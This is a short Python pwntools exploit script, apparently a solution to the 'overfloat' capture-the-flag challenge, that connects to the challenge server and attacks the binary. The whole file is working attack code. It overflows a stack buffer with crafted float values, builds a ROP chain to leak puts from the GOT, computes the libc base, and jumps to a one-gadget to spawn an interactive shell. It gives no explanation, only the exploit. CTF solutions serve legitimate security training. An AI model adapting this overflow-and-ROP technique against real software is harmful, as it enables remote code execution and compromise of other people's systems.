from pwn import *

libc = ELF("./libc-2.27.so")
e = ELF("./overfloat")
#p = process("./overfloat")
p = remote("challenges.fbctf.com", 1341)

def prep():
  for i in range(0x30 / 4 / 2):
    p.sendlineafter(":", "0")
    p.sendlineafter(":", "0")

def float_val(num):
  return struct.unpack('!f',struct.pack('!I', num))[0]
def write(num):
  p.sendlineafter(":", str(float_val(num % (1 << 32))))
  p.sendlineafter(":", str(float_val(num >> 32)))

prep()
write(0)

pop_rdi = 0x00400a83

write(pop_rdi)
write(e.got["puts"])
write(e.symbols["puts"])
write(e.symbols["main"])

p.sendlineafter(":", "done")

p.recvuntil("BON VOYAGE")
p.recvline()
libc_base = u64(p.recvline(keepends=False).ljust(8, "\x00")) - libc.symbols["puts"]
print("Libc Base: {:#x}".format(libc_base))

prep()

write(0)
write(libc_base + 0x4f2c5 )
p.sendlineafter(":", "done")

p.interactive()
